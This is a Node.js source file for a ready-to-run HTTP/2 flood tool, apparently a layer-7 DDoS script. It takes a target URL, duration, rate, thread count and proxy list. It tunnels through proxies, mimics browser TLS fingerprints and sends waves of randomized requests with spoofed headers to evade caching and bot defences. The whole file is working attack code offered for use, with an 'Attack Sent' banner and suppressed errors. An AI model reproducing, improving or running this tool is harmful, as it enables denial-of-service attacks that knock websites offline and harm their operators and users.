const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const colors = require("colors");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

function randstr(len){
    let s="";for(let i=0;i<len;i++)s+="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random()*62));
    return s;
}
function randnum(len){
    let s="";for(let i=0;i<len;i++)s+="0123456789".charAt(Math.floor(Math.random()*10));
    return s;
}
function randip(){
    return Array.from({length:4},()=>Math.floor(Math.random()*256)).join('.');
}
function randua(){
    const a=[
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+randnum(2)+".0."+randnum(4)+"."+randnum(2)+" Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+randnum(2)+".0."+randnum(4)+"."+randnum(2)+" Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+randnum(2)+".0."+randnum(4)+"."+randnum(2)+" Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:"+randnum(2)+".0) Gecko/20100101 Firefox/"+randnum(2)+".0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:"+randnum(2)+".0) Gecko/20100101 Firefox/"+randnum(2)+".0"
    ];
    return a[Math.floor(Math.random()*a.length)];
}
function randlang(){
    const a=[
        "en-US,en;q=0.9","fr-FR,fr;q=0.8,en;q=0.7","de-DE,de;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.8,zh;q=0.7","zh-CN,zh;q=0.9,en;q=0.8","es-ES,es;q=0.9,en;q=0.8"
    ];
    return a[Math.floor(Math.random()*a.length)];
}
function randenc(){
    const a=["gzip, deflate, br","gzip, deflate","identity","deflate","br"];
    return a[Math.floor(Math.random()*a.length)];
}
function randcache(){
    const a=["no-cache","no-store","max-age=0","must-revalidate","no-cache, no-store, must-revalidate"];
    return a[Math.floor(Math.random()*a.length)];
}
function randfetch(){
    const a=["navigate","same-origin","no-cors","cors"];
    return a[Math.floor(Math.random()*a.length)];
}
function randsite(){
    const a=["same-origin","same-site","cross-site","none"];
    return a[Math.floor(Math.random()*a.length)];
}
function randdest(){
    const a=["document","iframe","image","script","style","worker"];
    return a[Math.floor(Math.random()*a.length)];
}

const defaultCiphers=crypto.constants.defaultCoreCipherList.split(":");
const ciphers="GREASE:"+[
    defaultCiphers[2],defaultCiphers[1],defaultCiphers[0],...defaultCiphers.slice(3)
].join(":");
const sigalgs=[
    "ecdsa_secp256r1_sha256","rsa_pss_rsae_sha256","rsa_pkcs1_sha256","ecdsa_secp384r1_sha384","rsa_pss_rsae_sha384","rsa_pkcs1_sha384","rsa_pss_rsae_sha512","rsa_pkcs1_sha512"
].join(":");
const ecdhCurve="GREASE:X25519:x25519:P-256:P-384:P-521:X448";

const secureOptions=
    crypto.constants.SSL_OP_NO_SSLv2|
    crypto.constants.SSL_OP_NO_SSLv3|
    crypto.constants.SSL_OP_NO_TLSv1|
    crypto.constants.SSL_OP_NO_TLSv1_1|
    crypto.constants.SSL_OP_NO_TLSv1_3|
    crypto.constants.ALPN_ENABLED|
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION|
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE|
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT|
    crypto.constants.SSL_OP_COOKIE_EXCHANGE|
    crypto.constants.SSL_OP_PKCS1_CHECK_1|
    crypto.constants.SSL_OP_PKCS1_CHECK_2|
    crypto.constants.SSL_OP_SINGLE_DH_USE|
    crypto.constants.SSL_OP_SINGLE_ECDH_USE|
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if(process.argv.length<6){
    console.log("node flood.js <target> <time> <rate> <threads> <proxy.txt>");
    process.exit(0);
}
const secureProtocol="TLS_method";
const secureContextOptions={
    ciphers:ciphers,
    sigalgs:sigalgs,
    honorCipherOrder:true,
    secureOptions:secureOptions,
    secureProtocol:secureProtocol
};
const secureContext=tls.createSecureContext(secureContextOptions);

const args={
    target:process.argv[2],
    time:~~process.argv[3],
    rate:~~process.argv[4],
    threads:~~process.argv[5],
    proxyFile:process.argv[6]
};
const proxies=fs.readFileSync(args.proxyFile,"utf8").toString().split(/\r?\n/).filter(Boolean);
const parsedTarget=url.parse(args.target);
const MAX_RAM=80;
const RESTART_DELAY=1000;

if(cluster.isMaster){
    console.log("═════════════════════════════════════════════════════════════".gray);
    console.log(" VuXuanKien1997 Attack Sent".red.bold);
    console.log("═════════════════════════════════════════════════════════════".gray);

    const restart=()=>{
        for(const id in cluster.workers)cluster.workers[id].kill();
        setTimeout(()=>{for(let i=0;i<args.threads;i++)cluster.fork();},RESTART_DELAY);
    };
    const checkRAM=()=>{
        const used=(os.totalmem()-os.freemem())/os.totalmem()*100;
        if(used>=MAX_RAM)restart();
    };
    setInterval(checkRAM,5000);
    for(let i=0;i<args.threads;i++)cluster.fork();
}else{
    setInterval(runFlooder);
}

class NetSocket{
    HTTP(options,callback){
        const payload=`CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const conn=net.connect({host:options.host,port:options.port});
        conn.setTimeout(options.timeout*600000);
        conn.setKeepAlive(true,600000);
        conn.setNoDelay(true);
        conn.on("connect",()=>conn.write(payload));
        conn.on("data",chunk=>{
            if(chunk.toString().includes("HTTP/1.1 200"))callback(conn);
            else{conn.destroy();callback(null);}
        });
        conn.on("timeout",()=>conn.destroy());
        conn.on("error",()=>conn.destroy());
    }
}
const Socker=new NetSocket();

function runFlooder(){
    const proxy=proxies[Math.floor(Math.random()*proxies.length)];
    const [host,port]=proxy.split(":");
    const targetPort=parsedTarget.protocol==="https:"?443:80;
    const proxyOptions={host,port:~~port,address:parsedTarget.host,timeout:10};
    Socker.HTTP(proxyOptions,(connection)=>{
        if(!connection)return;
        connection.setKeepAlive(true,600000);
        connection.setNoDelay(true);

        const tlsOptions={
            port:targetPort,
            secure:true,
            ALPNProtocols:["h2"],
            ciphers,
            sigalgs,
            requestCert:true,
            socket:connection,
            ecdhCurve,
            honorCipherOrder:false,
            rejectUnauthorized:false,
            secureOptions,
            secureContext,
            host:parsedTarget.host,
            servername:parsedTarget.host,
            secureProtocol
        };
        const tlsConn=tls.connect(targetPort,parsedTarget.host,tlsOptions);
        tlsConn.allowHalfOpen=true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true,600000);
        tlsConn.setMaxListeners(0);

        const client=http2.connect(parsedTarget.href,{
            settings:{
                headerTableSize:65536,
                maxHeaderListSize:32768,
                initialWindowSize:15564991,
                maxFrameSize:16384
            },
            createConnection:()=>tlsConn
        });
        client.setMaxListeners(0);
        client.settings({enablePush:false,initialWindowSize:15564991});

        client.on("connect",()=>{
            const int=setInterval(()=>{
                for(let i=0;i<args.rate;i++){
                    const path=parsedTarget.path+"?"+randstr(5)+"="+randstr(10)+"&"+randstr(5)+"="+randstr(10)+"&"+randstr(5)+"="+randstr(10);
                    const headers={
                        ":method":"GET",
                        ":authority":parsedTarget.host,
                        ":scheme":"https",
                        ":path":path,
                        "user-agent":randua(),
                        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "accept-language":randlang(),
                        "accept-encoding":randenc(),
                        "cache-control":randcache(),
                        "pragma":"no-cache",
                        "upgrade-insecure-requests":"1",
                        "sec-fetch-dest":randdest(),
                        "sec-fetch-mode":randfetch(),
                        "sec-fetch-site":randsite(),
                        "sec-ch-ua":`"${randstr(8)}","${randstr(5)}","${randstr(6)}"`,
                        "sec-ch-ua-mobile":"?0",
                        "sec-ch-ua-platform":"\"Windows\"",
                        "x-forwarded-for":randip(),
                        "x-real-ip":randip(),
                        "dnt":"1",
                        "referer":"https://"+randstr(8)+".com/",
                        "cookie":randstr(6)+"="+randstr(20)+"; "+randstr(6)+"="+randstr(20)
                    };
                    const req=client.request(headers,{exclusive:true,weight:256});
                    req.on("response",()=>{req.close();req.destroy();});
                    req.end();
                }
            },250);
        });
        client.on("close",()=>{client.destroy();tlsConn.destroy();connection.destroy();});
        client.on("timeout",()=>{client.destroy();connection.destroy();});
        client.on("error",()=>{client.destroy();connection.destroy();});
    });
}

setTimeout(()=>process.exit(0),args.time*1000);
process.on("uncaughtException",()=>{});
process.on("unhandledRejection",()=>{});
